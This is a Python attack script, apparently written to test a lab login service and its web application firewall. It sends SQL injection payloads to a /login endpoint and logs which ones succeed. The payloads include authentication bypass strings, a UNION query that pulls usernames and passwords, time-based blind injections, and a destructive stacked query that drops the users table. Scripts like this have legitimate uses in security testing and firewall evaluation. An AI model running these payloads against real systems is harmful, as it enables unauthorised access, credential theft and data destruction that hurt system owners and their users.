import requests
import time
from datetime import datetime
import sys
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('SQLi')

class SQLInjectionAttacker:
    def __init__(self, target_ip, target_port=5000):
        self.target_url = f"http://{target_ip}:{target_port}/login"
        self.vulnerabilities = []
        self.blocked_count = 0
        self.failed_count = 0
        
    def test_payload(self, payload, description, password='anything'):
        """Test a single SQL injection payload"""
        print(f"\n{'='*60}")
        print(f"[{datetime.now()}] Testing: {description}")
        print(f"Payload: {payload}")
        print(f"{'='*60}")
        
        try:
            response = requests.post(
                self.target_url,
                json={'username': payload, 'password': password},
                timeout=5
            )
            result = response.json()
            
            if response.status_code == 403 and result.get('blocked'):
                print(f"🛡️  BLOCKED BY WAF: {result.get('message', 'Firewall detected malicious pattern')}")
                self.blocked_count += 1
                return False
            elif result.get('success'):
                print(f"✅ VULNERABLE: Authentication bypassed!")
                print(f"   User: {result.get('user', 'unknown')}")
                self.vulnerabilities.append({
                    'payload': payload,
                    'description': description,
                    'response': result
                })
                return True
            elif 'error' in result:
                print(f"⚠️  SQL ERROR: {result['error'][:100]}")
                print(f"   Database error indicates potential vulnerability")
                self.vulnerabilities.append({
                    'payload': payload,
                    'description': description,
                    'response': result,
                    'type': 'error-based'
                })
                return True
            else:
                print(f"❌ PROTECTED: {description}")
                self.failed_count += 1
                return False
                
        except requests.exceptions.Timeout:
            print(f"⏱️  TIMEOUT: Possible time-based blind injection")
            self.vulnerabilities.append({
                'payload': payload,
                'description': description,
                'type': 'time-based-blind'
            })
            return True
        except Exception as e:
            print(f"❌ ERROR: {str(e)}")
            self.failed_count += 1
            return False
    
    def run(self):
        """Execute SQL injection attack"""
        print(f"\n{'='*70}")
        print(f"SQL INJECTION ATTACK INITIATED")
        print(f"{'='*70}")
        print(f"Target: {self.target_url}")
        print(f"Timestamp: {datetime.now()}")
        print(f"{'='*70}\n")
        
        # Comprehensive SQL injection payloads
        payloads = [
            # Authentication Bypass
            ("' OR '1'='1", "Basic OR injection (authentication bypass)"),
            ("admin'--", "Comment injection (bypass password check)"),
            ("' OR 1=1--", "Boolean-based injection"),
            ("admin' #", "Hash comment injection"),
            ("' OR 'a'='a", "Alternative OR condition"),
            
            # UNION-based
            ("' UNION SELECT NULL, username, password FROM users--", "UNION injection (data extraction)"),
            ("' UNION SELECT NULL--", "UNION NULL injection"),
            
            # Time-based Blind
            ("admin' AND SLEEP(5)--", "Time-based blind injection (MySQL)"),
            ("admin' WAITFOR DELAY '00:00:05'--", "Time-based blind (SQL Server)"),
            
            # Stacked Queries
            ("'; DROP TABLE users--", "Stacked query (destructive)"),
            
            # Advanced Bypass Techniques
            ("admin' /*", "Block comment injection"),
            ("1' OR '1' = '1')) --", "Nested condition bypass"),
            ("' OR '1'='1' /*", "Comment-based bypass"),
        ]
        
        start_time = time.time()
        
        for payload, desc in payloads:
            self.test_payload(payload, desc)
            time.sleep(1)  # Rate limiting delay
        
        duration = time.time() - start_time
        
        # Summary
        print(f"\n{'='*70}")
        print(f"ATTACK SUMMARY")
        print(f"{'='*70}")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Total payloads tested: {len(payloads)}")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print(f"Blocked by firewall: {self.blocked_count}")
        print(f"Failed/Protected: {self.failed_count}")
        print(f"{'='*70}\n")
        
        if self.vulnerabilities:
            print("DETECTED VULNERABILITIES:")
            for idx, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{idx}. {vuln['description']}")
                print(f"   Payload: {vuln['payload']}")
                if 'type' in vuln:
                    print(f"   Type: {vuln['type']}")
        
        return self.vulnerabilities

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.10"
    
    attacker = SQLInjectionAttacker(target)
    try:
        results = attacker.run()
        
        # Exit code based on results
        if results:
            print("\n⚠️  TARGET IS VULNERABLE TO SQL INJECTION")
            sys.exit(1)
        else:
            print("\n✅ Target appears to be protected")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        sys.exit(130)
